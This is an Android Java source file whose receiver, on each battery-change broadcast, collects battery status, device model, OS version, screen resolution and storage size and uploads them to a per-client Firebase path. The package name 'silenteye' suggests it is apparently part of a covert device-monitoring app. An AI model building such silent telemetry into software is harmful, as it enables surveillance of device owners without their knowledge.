package com.silenteye;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.google.firebase.database.DatabaseReference;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class PowerSyncReceiver extends BroadcastReceiver {
    private static final String TAG = "PowerSyncReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BATTERY_CHANGED.equals(intent.getAction())) {
            Map<String, Object> metrics = new HashMap<>();

            // 1. Battery Data
            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int health = intent.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
            String technology = intent.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY);
            int plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            int temperature = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);

            Map<String, Object> batteryMetrics = new HashMap<>();
            batteryMetrics.put("level", level);
            batteryMetrics.put("scale", scale);
            batteryMetrics.put("health", getBatteryHealthText(health));
            batteryMetrics.put("technology", technology != null ? technology : "Unknown");
            batteryMetrics.put("plugged", getPluggedText(plugged));
            batteryMetrics.put("temperature", temperature / 10.0f); // Temperature is in tenths of a degree Celsius

            metrics.put("battery", batteryMetrics);

            // 2. Hardware Details
            String manufacturer = Build.MANUFACTURER;
            String model = Build.MODEL;
            String androidVersion = Build.VERSION.RELEASE;
            int sdkVersion = Build.VERSION.SDK_INT;

            Map<String, Object> hardwareMetrics = new HashMap<>();
            hardwareMetrics.put("deviceName", manufacturer + " " + model);
            hardwareMetrics.put("androidVersion", androidVersion + " (API " + sdkVersion + ")");
            hardwareMetrics.put("screenResolution", getScreenResolution(context));
            hardwareMetrics.put("totalStorage", getTotalStorageCapacity());

            metrics.put("hardware", hardwareMetrics);
            metrics.put("timestamp", System.currentTimeMillis());

            // 3. Send to Firebase under clients/{CLIENT_ID}/deviceMetrics
            DatabaseReference dbRef = ClientManager.getChildRef("deviceMetrics");
            dbRef.setValue(metrics)
                    .addOnSuccessListener(aVoid -> Log.d(TAG, "Successfully updated device metrics in Firebase"))
                    .addOnFailureListener(e -> Log.e(TAG, "Failed to update metrics", e));
        }
    }

    private String getBatteryHealthText(int health) {
        switch (health) {
            case BatteryManager.BATTERY_HEALTH_COLD: return "Cold";
            case BatteryManager.BATTERY_HEALTH_DEAD: return "Dead";
            case BatteryManager.BATTERY_HEALTH_GOOD: return "Good";
            case BatteryManager.BATTERY_HEALTH_OVERHEAT: return "Overheat";
            case BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE: return "Over Voltage";
            case BatteryManager.BATTERY_HEALTH_UNKNOWN: return "Unknown";
            case BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE: return "Unspecified Failure";
            default: return "Unknown";
        }
    }

    private String getPluggedText(int plugged) {
        switch (plugged) {
            case BatteryManager.BATTERY_PLUGGED_AC: return "AC";
            case BatteryManager.BATTERY_PLUGGED_USB: return "USB";
            case BatteryManager.BATTERY_PLUGGED_WIRELESS: return "Wireless";
            default: return "Unplugged";
        }
    }

    private String getScreenResolution(Context context) {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        if (windowManager != null) {
            DisplayMetrics metrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getMetrics(metrics);
            return metrics.widthPixels + "x" + metrics.heightPixels;
        }
        return "Unknown";
    }

    private String getTotalStorageCapacity() {
        try {
            File path = Environment.getDataDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long totalSpace = totalBlocks * blockSize;

            // Convert to GB
            double gb = totalSpace / (1024.0 * 1024.0 * 1024.0);
            return String.format("%.2f GB", gb);
        } catch (Exception e) {
            return "Unknown";
        }
    }
}
